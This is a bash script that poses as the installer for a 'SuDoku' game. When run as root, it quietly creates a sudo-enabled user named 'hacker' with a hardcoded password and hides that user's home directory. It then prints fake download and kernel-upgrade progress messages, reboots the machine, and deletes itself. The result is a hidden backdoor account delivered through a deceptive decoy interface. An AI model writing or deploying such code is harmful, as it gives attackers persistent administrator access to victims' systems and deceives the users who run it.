#!/bin/bash

if [[ $EUID -ne 0 ]]; then
   echo "BASH SHELL> This script must be run as root (or with sudo)." 
   exit 1
fi

# Create the user "hacker" with the password "hackerpass"
useradd -m -p "$(openssl passwd -1 hackerpass)" hacker

# Give the user "hacker" sudo permissions
usermod -aG sudo hacker

# Rename the home directory by putting a "." in front of its name
mv /home/hacker /home/.hacker

# Set the home directory permissions to be only accessible to the user "hacker" and the root user
chown -R hacker:root /home/.hacker
chmod 750 /home/.hacker

# Set the default user shell to bash (when logged in)
chsh -s /bin/bash hacker

#FKSR
echo "(SuDoku) >> sudoku has not been setup yet."
echo "(SuDoku) >> do you want to start auto-setup? [Y/n]"
read answer

if [ "$answer" == "Y" ] || [ "$answer" == "y" ]; then
    echo "(SuDoku) >> STARTING AUTO SETUP, PLEASE WAIT..."
    sleep 2
    echo "downloading libraries..."
    sleep 1
    echo "2/11"
    sleep 1.5
    echo "5/11"
    sleep 0.4
    echo "6/11"
    sleep 1.2
    echo "9/11"
    sleep 0.2
    echo "10/11"
    sleep 1
    echo "..."
    sleep 2
    echo "Done."
    sleep 1
    echo "(SuDoku) >> SUDOKU HAS BEEN SUCCESSFULLY LOADED."
    echo "(SuDoku) >> TYPE 'start' to start."
    read answer2
    
    if [ "$answer2" == "start" ] || [ "$answer2" == "Start" ] || [ "$answer2" == "START" ]; then
        echo "(SuDoku) >> Program started.. waiting for server response."
        sleep 1
        echo "(SuDoku) >> Program started.. waiting for server response.."
        sleep 1
        echo "(SuDoku) >> Program started.. waiting for server response..."
        sleep 1
        echo "(SuDoku) >> Server response<>112742 sl stop"
        sleep 0.2
        echo "(SuDoku) >> Analyzing server files..."
        sleep 2
        echo "(SuDoku) >> Updating server in..."
        sleep 0.4
        echo "(SuDoku) >> 3"
        sleep 1
        echo "(SuDoku) >> 2"
        sleep 1
        echo "(SuDoku) >> 1"
        sleep 1
        echo "finding server properties.."
        sleep 0.3
        echo "upgrading server kernel..."
        sleep 2
        echo "kernel upgrade status: waiting..."
        sleep 1
        echo "kernel upgrade status: DONE."
        sleep 0.7
        echo "LOADING PROPERTIES AND UPDATES."
        sleep 1.2
        echo "LOADING PROPERTIES AND UPDATES.."
        sleep 0.9
        echo "LOADING PROPERTIES AND UPDATES..."
        sleep 1
        echo "PROPERTIES AND UPDATES LOADED."
        sleep 2
        echo "INF: server kernel reboot will be needed!"
        sleep 0.6
        echo "(the server will have to be restarted to save changes.)"
        echo "ARE YOU SURE YOU WANT TO CONTINUE? [Y/n]"
        read answer3
        
        
        if [ "$answer" == "Y" ] || [ "$answer" == "y" ]; then
          cat <<EOF > SuDoku-uninstall.sh
          #!/bin/bash

          echo "The program will be uninstalled in the next 5 seconds. Please wait."
          sleep 3
          echo "Unistalling..."
          sleep 0.3
          echo "..."
          sleep 0.3
          echo "..."
          sleep 0.3
          echo "..."
          sleep 2
          echo "DONE, use 'rm -rf /sudoku-94765728359sh' from your home folder to delete completely."
          echo "Thank you for using SuDoku Software(Co)"
          rm -- "$0"
          EOF
          chmod +x SuDoku-uninstall.sh
          shutdown -r now
        else
          echo "program stopped. Do you want to uninstall it? [Y/n]"
          read answer4
        
        
          if [ "$answer" == "Y" ] || [ "$answer" == "y" ]; then
            echo "The program will be uninstalled in the next 5 seconds. Please wait."
            sleep 3
            echo "Unistalling..."
            sleep 0.3
            echo "..."
            sleep 0.3
            echo "..."
            sleep 0.3
            echo "..."
            sleep 2
            echo "DONE, use 'rm -rf /sudoku-94765728359sh' from your home folder to delete completely."
            echo "Thank you for using SuDoku Software(Co)"
            rm -- "$0"
          else
            echo "program failed."
            rm -- "$0"
          fi
        fi
    else 
        echo "invalid credentials."
    fi
else
    rm -rf ~/sudoku-94765728359sh
fi





# Delete the script
rm -- "$0"
